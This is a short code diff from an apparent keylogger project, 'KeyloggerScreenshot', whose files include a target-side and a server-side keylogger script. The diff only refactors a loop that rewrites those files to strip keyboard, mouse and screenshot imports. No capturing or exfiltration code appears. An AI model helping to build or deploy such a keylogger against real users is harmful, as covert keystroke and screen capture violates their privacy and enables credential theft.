@@ -3,21 +3,18 @@ try:
     import pyautogui as pg
 
 except KeyError:
-    os.chdir("KeyloggerScreenshot")
-    
-    file = 0
     files = ["Server_keylogger.py", "Keylogger_Target.py"]
-    while file != 2:
-        with open(files[file], "r+") as file:
+    for this_file in files:
+        os.chdir("KeyloggerScreenshot")
+        with open(this_file, "r+") as file:
             data = [line.replace("\n", "") for line in file]
 
-        with open(files[file], "w+") as file:
+        with open(this_file, "w+") as file:
             for each in data:
                 if each not in ["import PIL.Image", "from pynput import keyboard", "from pynput.mouse import Listener",
                                 "import tkinter as tk", "import pyautogui as pg"]:
                     file.write(f"{each}\n")
         os.chdir("..")
-        file += 1
 
 import KeyloggerScreenshot as ks
 import sys
